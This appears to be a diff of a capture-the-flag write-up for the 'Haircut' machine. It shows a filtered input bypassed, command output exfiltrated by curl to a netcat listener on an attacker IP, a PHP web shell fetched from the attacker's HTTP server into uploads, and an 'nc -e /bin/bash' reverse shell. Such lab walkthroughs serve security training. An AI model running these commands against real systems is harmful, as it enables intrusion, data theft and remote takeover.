@@ -88,23 +88,26 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /uploads (Status: 301)
 /exposed.php (Status: 200)
 ```
-The page `/exposed.php` has a text input, and when passing a URL it displays on screen the result of curling it. I tried to inject some command but some symbols/keywords were blocked e.g. &, | (pipe), python and nc. Curl flags are not blocked, though.
 
-Checking `curl` man's page for ways to get more information about the system, I thought of sending information through body data of a curl request sent to a `nc` listener.
+The page `/exposed.php` has a text input, and when passing a URL it displays on screen the result of curling it. I tried to inject some command but some symbols/keywords were blocked e.g. &, ;, |, python and nc. Curl flags are not blocked, though.
+
+Checking `curl` man's page for ways to get more information about the system or executing arbitrary code, I thought of sending information through body data of a curl request sent to a `nc` listener on the attacker machine.
 
 Set up listener from attacker: 
 ```
 nc -lvp 4444
 ```
 
-Commands now can be executed like this, and the result of the executed command will be passed as data to the listener:
+Commands now can be executed from the input as follows, and the result of the executed command will be passed as data to the listener:
 ```
-curl $ATTACKERIP:4444 -d "`command goes here`"
+$ATTACKERIP:4444 -d "`command goes here`"
 ```
 
-So, if command is `whoami`, the ouput is `www-data`.
+So, the next couple of commands I'll list here will use this trick.
 
-It is possible to get the user flag already from here:
+If command is `whoami`, the listener will print `www-data`.
+
+It is possible to get the user flag already from here the same way:
 ```
 cat /home/maria/Desktop/user
 ```
@@ -128,14 +131,14 @@ drwxr-xr-x 3 root     root     4.0K May 16  2017 ..
 drwxr-xr-x 2 www-data www-data 4.0K May 22  2017 uploads
 ```
 
-It seems `uploads` may be a good place where to place a web shell. I'm going to use a shell called `Predator.php` I got from this repo https://github.com/JohnTroony/php-webshells.git. The first step is to make the shell "curleable" by exposing it through an http server:
+It seems `uploads` may be a good place where to place a web shell. I'm going to use a PHP web shell called `Predator.php` present in this repo https://github.com/JohnTroony/php-webshells.git. The first step is to make the shell "curleable" by exposing it through an http server in the attacker:
 ```
-cd php-webshells
-python -m SimpleHTTPServer
+$ cd php-webshells
+$ python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 ```
 
-And now from the input in /exposed.php we curl it to uploads:
+And now from the input in /exposed.php we curl it to uploads leveraging the `-o` (output file) flag:
 ```
 10.10.14.23:8000/Predator.php -o uploads/Predator.php
 ```
@@ -147,7 +150,7 @@ Set `nc` listener in the attacker to handle the reverse shell:
 nc -lvp 4444
 ```
 
-The webshell allows the user to execute in a shell. Connect to the attacker as follows:
+The webshell allows the user to execute in the target system. Connect to the attacker as follows:
 ```
 nc $IP_ATTACKER 4444 -e /bin/bash
 ```
@@ -155,5 +158,4 @@ nc $IP_ATTACKER 4444 -e /bin/bash
 Upgrade shell to more interactive one:
 ```
 python3 -c "import pty; pty.spawn('/bin/bash');"
-www-data@haircut:/tmp$
 ```
